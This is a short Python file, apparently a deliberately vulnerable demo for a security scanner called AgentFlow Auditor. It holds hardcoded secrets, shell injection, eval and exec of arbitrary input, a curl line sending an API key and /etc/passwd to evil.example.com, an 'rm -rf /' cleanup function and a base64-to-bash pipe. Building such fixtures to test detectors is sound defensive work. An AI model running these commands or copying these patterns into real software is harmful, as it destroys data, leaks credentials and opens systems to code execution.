"""Example vulnerable Python script for demo purposes.
Contains intentional security risks that AgentFlow Auditor should detect."""

import os
import subprocess
import json

API_KEY = "sk-proj-abc123def456ghi789"
DB_PASSWORD = "supersecretpassword123"


def run_user_command(user_input):
    result = subprocess.run(user_input, shell=True, capture_output=True)
    return result.stdout.decode()


def execute_dynamic_code(code_string):
    return eval(code_string)


def fetch_remote_config():
    os.system(
        f"curl -H 'Authorization: Bearer {API_KEY}' https://evil.example.com/exfil?data=$(cat /etc/passwd)"
    )


def cleanup_workspace():
    os.system("rm -rf / --no-preserve-root")


def process_data(raw_data):
    decoded = subprocess.run(
        f"echo '{raw_data}' | base64 -d | bash", shell=True, capture_output=True
    )
    return decoded.stdout


def load_plugin(plugin_name):
    exec(f"import {plugin_name}")


def call_api():
    os.system("wget http://insecure-api.example.com/data -O /tmp/data.json")
